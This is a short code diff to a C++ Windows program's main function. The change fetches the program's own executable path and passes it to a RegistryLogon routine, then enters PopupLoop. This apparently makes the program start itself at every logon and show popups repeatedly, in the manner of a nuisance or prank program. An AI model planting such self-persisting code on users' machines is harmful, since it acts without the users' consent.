@@ -7,12 +7,6 @@
 
 int main(int argc, char* argv[]) {
     Mutex mutex(NULL, MUTEX_NAME, NULL, MUTEX_ALL_ACCESS);
-    
-    char filePath[MAX_PATH];
-    GetModuleFileNameA(NULL, filePath, MAX_PATH);
-    
-    std::cout << filePath << "\n";
-
     DWORD wait = mutex.waitForSingleObject(0);
 
     if (wait != 0) {
@@ -20,10 +14,11 @@ int main(int argc, char* argv[]) {
         exit(1);
     }
 
-    LPCSTR path = argv[0];
-    SIZE_T pathLength = strlen(path) + 1;
+    char path[MAX_PATH];
+    
+    getProcessExe(path, MAX_PATH);
 
-    RegistryLogon(path, pathLength);
+    RegistryLogon(path, strlen(path) + 1);
 
     PopupLoop();
 
